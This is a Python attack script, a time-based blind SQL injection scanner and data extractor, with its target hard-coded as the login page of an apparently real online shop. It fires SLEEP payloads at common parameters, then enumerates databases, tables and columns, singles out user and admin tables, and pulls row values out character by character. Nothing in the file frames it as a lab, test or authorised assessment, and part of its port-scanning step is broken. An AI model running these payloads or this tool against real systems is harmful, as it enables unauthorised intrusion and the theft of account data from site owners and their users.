import requests
import time
import string
import itertools
from urllib.parse import urlencode, quote
import sys

# Target configuration
TARGET_URL = "https://dipelectronicslabshop.in/wp-login.php"
PORTS = [80, 8080, 443, 8443, 3000, 5000, 8000]  # Common web ports
TIME_DELAY = 5  # seconds for SLEEP()
TIMEOUT_THRESHOLD = 4  # seconds to consider as a delay

class BlindSQLInjectionScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerable_params = []
        
    def test_time_based_injection(self, url, param_name, param_value, method='GET'):
        """Test for time-based blind SQL injection"""
        
        # MySQL/MariaDB payloads
        payloads = [
            f"' AND SLEEP({TIME_DELAY})--",
            f"' AND SLEEP({TIME_DELAY})-- -",
            f"' OR SLEEP({TIME_DELAY})--",
            f"1' AND SLEEP({TIME_DELAY})--",
            f"1' OR SLEEP({TIME_DELAY})--",
            f"' AND (SELECT * FROM (SELECT(SLEEP({TIME_DELAY})))x)--",
            f"' OR (SELECT * FROM (SELECT(SLEEP({TIME_DELAY})))x)--",
            f"1 AND SLEEP({TIME_DELAY})--",
            f"1 OR SLEEP({TIME_DELAY})--",
            f"') AND SLEEP({TIME_DELAY})--",
            f"') OR SLEEP({TIME_DELAY})--",
            f"\") AND SLEEP({TIME_DELAY})--",
            f"\") OR SLEEP({TIME_DELAY})--",
        ]
        
        for payload in payloads:
            test_value = param_value + payload
            
            start_time = time.time()
            try:
                if method == 'GET':
                    response = self.session.get(
                        url,
                        params={param_name: test_value},
                        timeout=TIME_DELAY + 5
                    )
                else:
                    response = self.session.post(
                        url,
                        data={param_name: test_value},
                        timeout=TIME_DELAY + 5
                    )
                    
                elapsed = time.time() - start_time
                
                if elapsed >= TIMEOUT_THRESHOLD:
                    print(f"[+] VULNERABLE! Payload: {payload}")
                    print(f"[+] Response time: {elapsed:.2f}s")
                    return payload
                    
            except requests.Timeout:
                print(f"[+] VULNERABLE! (Timeout) Payload: {payload}")
                return payload
            except Exception as e:
                pass
                
        return None
    
    def discover_parameters(self, url):
        """Try to discover injectable parameters"""
        print(f"[*] Scanning {url} for parameters...")
        
        # Common parameter names
        common_params = [
            'id', 'user', 'username', 'userid', 'uid', 'name', 'page',
            'search', 'query', 'q', 'key', 'category', 'cat', 'action',
            'item', 'product', 'pid', 'order', 'sort', 'filter', 'type',
            'login', 'email', 'password', 'pass', 'token', 'session'
        ]
        
        vulnerable = []
        
        for param in common_params:
            print(f"[*] Testing parameter: {param}", end='\r')
            
            # Test GET
            payload = self.test_time_based_injection(url, param, '1', 'GET')
            if payload:
                vulnerable.append({
                    'url': url,
                    'param': param,
                    'method': 'GET',
                    'payload': payload
                })
                print(f"\n[+] Found vulnerable GET parameter: {param}")
            
            # Test POST
            payload = self.test_time_based_injection(url, param, '1', 'POST')
            if payload:
                vulnerable.append({
                    'url': url,
                    'param': param,
                    'method': 'POST',
                    'payload': payload
                })
                print(f"\n[+] Found vulnerable POST parameter: {param}")
        
        return vulnerable
    
    def find_databases(self, vuln_info):
        """Enumerate database names"""
        print("\n[*] Enumerating databases...")
        
        # Get number of databases
        db_count = self.binary_search_length(
            vuln_info,
            "SELECT COUNT(*) FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','mysql','performance_schema','sys')"
        )
        
        print(f"[+] Found {db_count} user databases")
        
        databases = []
        for i in range(db_count):
            db_name = self.extract_string(
                vuln_info,
                f"SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','mysql','performance_schema','sys') LIMIT {i},1"
            )
            if db_name:
                databases.append(db_name)
                print(f"[+] Database {i+1}: {db_name}")
        
        return databases
    
    def find_tables(self, vuln_info, database):
        """Enumerate tables in a database"""
        print(f"\n[*] Enumerating tables in database: {database}")
        
        # Get table count
        table_count = self.binary_search_length(
            vuln_info,
            f"SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{database}'"
        )
        
        print(f"[+] Found {table_count} tables")
        
        tables = []
        for i in range(table_count):
            table_name = self.extract_string(
                vuln_info,
                f"SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT {i},1"
            )
            if table_name:
                tables.append(table_name)
                print(f"[+] Table {i+1}: {table_name}")
        
        return tables
    
    def find_columns(self, vuln_info, database, table):
        """Enumerate columns in a table"""
        print(f"\n[*] Enumerating columns in {database}.{table}")
        
        column_count = self.binary_search_length(
            vuln_info,
            f"SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}'"
        )
        
        print(f"[+] Found {column_count} columns")
        
        columns = []
        for i in range(column_count):
            column_name = self.extract_string(
                vuln_info,
                f"SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT {i},1"
            )
            if column_name:
                columns.append(column_name)
                print(f"[+] Column {i+1}: {column_name}")
        
        return columns
    
    def extract_data(self, vuln_info, database, table, columns, limit=10):
        """Extract data from specified columns"""
        print(f"\n[*] Extracting data from {database}.{table}")
        print(f"[*] Columns: {', '.join(columns)}")
        
        # Get row count
        row_count = self.binary_search_length(
            vuln_info,
            f"SELECT COUNT(*) FROM {database}.{table}"
        )
        
        print(f"[+] Found {row_count} rows")
        
        rows = []
        for i in range(min(row_count, limit)):
            row = {}
            print(f"\n[*] Extracting row {i+1}/{min(row_count, limit)}")
            
            for column in columns:
                value = self.extract_string(
                    vuln_info,
                    f"SELECT {column} FROM {database}.{table} LIMIT {i},1"
                )
                row[column] = value
                print(f"  {column}: {value}")
            
            rows.append(row)
        
        return rows
    
    def binary_search_length(self, vuln_info, query):
        """Use binary search to find the result of a COUNT query"""
        low, high = 0, 100
        
        while low < high:
            mid = (low + high + 1) // 2
            
            # Test if result >= mid
            test_query = f"(SELECT CASE WHEN ({query})>={mid} THEN SLEEP({TIME_DELAY}) ELSE 0 END)"
            
            if self.test_condition(vuln_info, test_query):
                low = mid
            else:
                high = mid - 1
        
        return low
    
    def extract_string(self, vuln_info, query, max_length=50):
        """Extract a string value using time-based blind SQL injection"""
        
        # First, find the length
        length = 0
        for l in range(1, max_length + 1):
            test_query = f"(SELECT CASE WHEN LENGTH(({query}))={l} THEN SLEEP({TIME_DELAY}) ELSE 0 END)"
            
            print(f"[*] Testing length {l}...", end='\r')
            
            if self.test_condition(vuln_info, test_query):
                length = l
                print(f"[+] String length: {length}" + " " * 20)
                break
        
        if length == 0:
            return ""
        
        # Extract each character
        result = ""
        charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + '_-@.'
        
        for position in range(1, length + 1):
            for char in charset:
                test_query = f"(SELECT CASE WHEN SUBSTRING(({query}),{position},1)='{char}' THEN SLEEP({TIME_DELAY}) ELSE 0 END)"
                
                print(f"[*] Position {position}/{length}: Testing '{char}'...", end='\r')
                
                if self.test_condition(vuln_info, test_query):
                    result += char
                    print(f"[+] Found: {result}" + " " * 30)
                    break
        
        return result
    
    def test_condition(self, vuln_info, condition):
        """Test a SQL condition using time-based technique"""
        url = vuln_info['url']
        param = vuln_info['param']
        method = vuln_info['method']
        base_payload = vuln_info['payload']
        
        # Construct the payload
        # Replace SLEEP() part with our condition
        if 'SLEEP' in base_payload:
            # Extract the injection point
            parts = base_payload.split('SLEEP')
            payload = parts[0] + condition + '--'
        else:
            payload = base_payload.replace('--', f' AND {condition}--')
        
        start_time = time.time()
        try:
            if method == 'GET':
                response = self.session.get(
                    url,
                    params={param: '1' + payload},
                    timeout=TIME_DELAY + 5
                )
            else:
                response = self.session.post(
                    url,
                    data={param: '1' + payload},
                    timeout=TIME_DELAY + 5
                )
            
            elapsed = time.time() - start_time
            return elapsed >= TIMEOUT_THRESHOLD
            
        except requests.Timeout:
            return True
        except Exception as e:
            return False

def scan_ports(ip):
    """Scan for web services"""
    print(f"[*] Scanning {ip} for web services...")
    
    discovered_urls = []
    
    for port in PORTS:
        for protocol in ['http', 'https']:
            url = f"{protocol}://{ip}:{port}"
            
            try:
                print(f"[*] Trying {url}...", end='\r')
                response = requests.get(url, timeout=3, verify=False)
                
                if response.status_code < 500:
                    print(f"[+] Found web service: {url} (Status: {response.status_code})")
                    discovered_urls.append(url)
                    
                    # Try common paths
                    common_paths = ['', '/login', '/admin', '/user', '/api', '/search']
                    for path in common_paths:
                        test_url = url + path
                        try:
                            r = requests.get(test_url, timeout=2, verify=False)
                            if r.status_code == 200:
                                print(f"  [+] Found endpoint: {test_url}")
                                discovered_urls.append(test_url)
                        except:
                            pass
                            
            except:
                pass
    
    return discovered_urls

def main():
    print("="*70)
    print("Blind SQL Injection Scanner & Exploitation Tool")
    print("="*70)
    print(f"Target: {TARGET_URL}")
    print(f"Time delay: {TIME_DELAY} seconds")
    print("="*70 + "\n")
    
    # Disable SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    # Step 1: Scan for web services
    urls = scan_ports(TARGET_URL)
    
    if not urls:
        print("\n[-] No web services found")
        print("[*] Try specifying a URL manually:")
        print(f"    python script.py http://{TARGET_URL}")
        return
    
    # Step 2: Scan each URL for SQL injection
    all_vulnerabilities = []
    
    for url in urls:
        scanner = BlindSQLInjectionScanner(url)
        vulns = scanner.discover_parameters(url)
        all_vulnerabilities.extend(vulns)
    
    if not all_vulnerabilities:
        print("\n[-] No SQL injection vulnerabilities found")
        return
    
    print(f"\n[+] Found {len(all_vulnerabilities)} vulnerable parameter(s)")
    
    # Step 3: Exploit the first vulnerability
    vuln = all_vulnerabilities[0]
    print(f"\n[*] Exploiting: {vuln['url']} ({vuln['method']} {vuln['param']})")
    
    scanner = BlindSQLInjectionScanner(vuln['url'])
    
    # Find databases
    databases = scanner.find_databases(vuln)
    
    if not databases:
        print("[-] No databases found")
        return
    
    # Ask user which database to enumerate
    print("\n[*] Select a database to enumerate:")
    for i, db in enumerate(databases):
        print(f"  {i+1}. {db}")
    
    db_choice = input("\nEnter number (default: 1): ").strip()
    db_index = int(db_choice) - 1 if db_choice.isdigit() else 0
    target_db = databases[db_index]
    
    # Find tables
    tables = scanner.find_tables(vuln, target_db)
    
    if not tables:
        print("[-] No tables found")
        return
    
    # Look for users table
    user_tables = [t for t in tables if 'user' in t.lower() or 'admin' in t.lower() or 'account' in t.lower()]
    
    if user_tables:
        print(f"\n[+] Found potential user tables: {', '.join(user_tables)}")
        target_table = user_tables[0]
    else:
        print("\n[*] Select a table to enumerate:")
        for i, table in enumerate(tables):
            print(f"  {i+1}. {table}")
        
        table_choice = input("\nEnter number (default: 1): ").strip()
        table_index = int(table_choice) - 1 if table_choice.isdigit() else 0
        target_table = tables[table_index]
    
    # Find columns
    columns = scanner.find_columns(vuln, target_db, target_table)
    
    if not columns:
        print("[-] No columns found")
        return
    
    # Extract data
    print(f"\n[*] Extracting data from {target_db}.{target_table}")
    rows = scanner.extract_data(vuln, target_db, target_table, columns, limit=5)
    
    # Display results
    print("\n" + "="*70)
    print("EXTRACTED DATA")
    print("="*70)
    for i, row in enumerate(rows):
        print(f"\nRow {i+1}:")
        for column, value in row.items():
            print(f"  {column}: {value}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        # URL provided as argument
        url = sys.argv[1]
        scanner = BlindSQLInjectionScanner(url)
        vulns = scanner.discover_parameters(url)
        
        if vulns:
            vuln = vulns[0]
            databases = scanner.find_databases(vuln)
            # Continue with exploitation...
        else:
            print("[-] No vulnerabilities found")
    else:
        main()